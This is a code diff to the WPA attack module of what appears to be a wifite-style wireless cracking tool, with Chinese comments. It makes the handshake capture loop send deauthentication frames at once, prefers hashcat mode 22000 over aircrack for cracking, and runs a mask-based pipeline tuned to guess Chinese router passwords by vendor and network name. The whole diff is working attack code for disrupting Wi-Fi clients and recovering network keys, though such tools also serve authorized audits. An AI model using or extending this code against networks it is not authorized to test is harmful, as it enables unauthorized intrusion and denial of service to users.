@@ -65,11 +65,10 @@ class AttackWPA(Attack):
         wl_name = os.path.split(Configuration.wordlist)[-1]
         Color.pl('\n{+} {C}%s{W}' % t('wpa.crack', wl_name))
 
-        # Crack it
-        key = Aircrack.crack_handshake(handshake, show_command=False)
+        # 优先 hashcat -m 22000（认 --runtime / path_deadline），失败再 aircrack（墙钟 kill）
+        key = self._crack_handshake(handshake)
         if key is None:
             Color.pl('{!} {R}%s{W}' % t('wpa.fail'))
-            # 国内 WiFi 智能优化：aircrack 字典失败后，转 hc22000 走 hashcat 掩码管线（闭环）
             if getattr(Configuration, 'cn_optimize', False):
                 key = self._cn_mask_pipeline(handshake)
 
@@ -88,6 +87,26 @@ class AttackWPA(Attack):
         self.success = True
         return self.success
 
+    def _crack_handshake(self, handshake):
+        '''握手爆破：hashcat(预算) → aircrack(预算)。'''
+        from ..tools.hashcat import HcxPcapTool, Hashcat
+        # 预算尽则不爆破
+        if Hashcat.budget_exhausted():
+            return None
+
+        # 1) hashcat 22000（与 PMKID 同源，支持 --runtime）
+        if Process.exists('hashcat') and HcxPcapTool.exists():
+            try:
+                key = Hashcat.crack_handshake(handshake, show_command=False)
+                if key:
+                    return key
+            except Exception:
+                pass
+
+        # 2) aircrack 带墙钟上限
+        if Hashcat.budget_exhausted():
+            return None
+        return Aircrack.crack_handshake(handshake, show_command=False)
 
     def _cn_mask_pipeline(self, handshake):
         '''国内 WiFi 掩码自动管线：cap→hc22000→hashcat 多掩码爆破，命中即返回。'''
@@ -99,20 +118,20 @@ class AttackWPA(Attack):
             if not Process.exists('hashcat') or not HcxPcapTool.exists():
                 Color.pl('{!} {O}%s{W}' % t('wpa.cn_skip'))
                 return None
-            # 路径预算已尽则跳过
-            if Hashcat._runtime_seconds() < 1 and getattr(Configuration, 'path_deadline', None):
+            if Hashcat.budget_exhausted():
                 return None
             hc_file = HcxPcapTool.generate_hc22000_file(handshake.capfile)
         except Exception as e:
             Color.pl('{!} {O}%s{W}' % t('wpa.cn_fail', str(e)))
             return None
         try:
+            from ..tools.hashcat import Hashcat
             vendor = identify_vendor(self.target.bssid) or ''
             masks = recommend_masks(self.target.essid, vendor,
                                     limit=getattr(Configuration, 'cn_mask_limit', 4))
             Color.pl('{+} {O}%s{W}' % t('wpa.cn_run', len(masks)))
             for idx, mask in enumerate(masks, 1):
-                if Hashcat._runtime_seconds() < 1 and getattr(Configuration, 'path_deadline', None):
+                if Hashcat.budget_exhausted():
                     break
                 Color.pl('{+} {C}CN-OPT{W} mask {C}%d/%d{W} {D}%s{W} ...' % (idx, len(masks), mask))
                 key = Hashcat.crack_hc22000_mask(hc_file, mask, verbose=False)
@@ -154,9 +173,15 @@ class AttackWPA(Attack):
                     return handshake
 
             timeout_timer = Timer(Configuration.wpa_attack_timeout)
-            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
+            # Timer(0) → 首轮立即 deauth，再按 wpa_deauth_timeout 周期补发
+            deauth_timer = Timer(0)
 
             while handshake is None and not timeout_timer.ended():
+                # 路径总预算截止则提前结束捕获，把时间留给爆破
+                if getattr(Configuration, 'path_deadline', None) is not None:
+                    if time.time() >= Configuration.path_deadline:
+                        break
+
                 step_timer = Timer(1)
                 Color.clear_entire_line()
                 Color.pattack('WPA',
@@ -164,10 +189,14 @@ class AttackWPA(Attack):
                         'Handshake capture',
                         'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (len(self.clients), deauth_timer, timeout_timer))
 
+                # 开局 / 周期 deauth（间隔已由调度器与捕获窗口联动）
+                if deauth_timer.ended():
+                    self.deauth(airodump_target)
+                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)
+
                 # Find .cap file
                 cap_files = airodump.find_files(endswith='.cap')
                 if len(cap_files) == 0:
-                    # No cap files yet
                     time.sleep(step_timer.remaining())
                     continue
                 cap_file = cap_files[0]
@@ -181,7 +210,6 @@ class AttackWPA(Attack):
                 essid = airodump_target.essid if airodump_target.essid_known else None
                 handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                 if handshake.has_handshake():
-                    # We got a handshake
                     Color.clear_entire_line()
                     Color.pattack('WPA',
                             airodump_target,
@@ -190,9 +218,7 @@ class AttackWPA(Attack):
                     Color.pl('')
                     break
 
-                # There is no handshake
                 handshake = None
-                # Delete copied .cap file in temp to save space
                 os.remove(temp_file)
 
                 # Look for new clients
@@ -207,15 +233,8 @@ class AttackWPA(Attack):
                         Color.pl('')
                         self.clients.append(client.station)
 
-                # Send deauth to a client or broadcast
-                if deauth_timer.ended():
-                    self.deauth(airodump_target)
-                    # Restart timer
-                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)
-
-                # Sleep for at-most 1 second
                 time.sleep(step_timer.remaining())
-                continue # Handshake listen+deauth loop
+                continue
 
         if handshake is None:
             # No handshake, attack failed.
